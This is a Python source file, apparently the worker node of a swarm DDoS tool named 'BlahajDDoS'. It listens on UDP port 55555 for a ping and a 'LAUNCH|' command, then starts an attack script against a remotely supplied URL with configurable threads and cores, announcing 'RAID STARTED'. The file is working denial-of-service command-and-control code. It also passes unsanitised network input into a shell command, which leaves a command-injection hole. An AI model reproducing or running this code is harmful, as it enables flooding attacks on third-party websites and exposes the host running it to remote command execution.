import socket
import subprocess
import os
import json

# --- CONFIGURATION ---
PORT = 55555
# Use expandvars to resolve %USERPROFILE% dynamically for any user
RAW_PATH = r"%USERPROFILE%\Downloads\BlahajDDoS-main\BlahajDDoS-main\Blahajddos\Worker"
PROJECT_DIR = os.path.expandvars(RAW_PATH)

BEAMER_FILE = os.path.join(PROJECT_DIR, "blahajbeamer.py")
ANIM_FILE = os.path.join(PROJECT_DIR, "shark_anim.py")

def start_worker():
    # Verify files exist
    if not os.path.exists(PROJECT_DIR):
        print(f"[!] Directory not found: {PROJECT_DIR}")
        return

    for f in [BEAMER_FILE, ANIM_FILE]:
        if not os.path.exists(f):
            print(f"[!] Warning: {f} not found!")

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('', PORT))
    except Exception as e:
        print(f"[!] Port busy or Bind Error: {e}")
        return

    print(f"[*] Worker 'Eto' Ready. Waiting for Swarm Command...")

    beamer_proc = None
    anim_proc = None

    while True:
        data, addr = sock.recvfrom(4096)
        
        if data == b"BLAHAJ_PING":
            sock.sendto(b"BLAHAJ_ACK", addr)
            
        elif data.startswith(b"LAUNCH|"):
            if beamer_proc: beamer_proc.terminate()
            if anim_proc: anim_proc.terminate()
            
            try:
                payload = data.decode().split("|")[1]
                conf = json.loads(payload)
                
                # 1. LAUNCH THE BEAMER (The Attack)
                beamer_cmd = (
                    f'start /min cmd /k python "{BEAMER_FILE}" '
                    f'--url {conf["url"]} --mode {conf["mode"]} '
                    f'--cores {conf["cores"]} --threads {conf["threads"]} '
                    f'--bloat {"y" if conf["bloat"] else "n"}'
                )
                beamer_proc = subprocess.Popen(beamer_cmd, shell=True, cwd=PROJECT_DIR)

                # 2. LAUNCH THE ANIMATION (The Visuals)
                anim_cmd = f'start cmd /k python "{ANIM_FILE}"'
                anim_proc = subprocess.Popen(anim_cmd, shell=True, cwd=PROJECT_DIR)

                print(f"[+] RAID STARTED: {conf['url']}")
                print(f"[+] Animation Initialized.")
                
            except Exception as e:
                print(f"[!] Launch Error: {e}")

if __name__ == "__main__":
    start_worker()
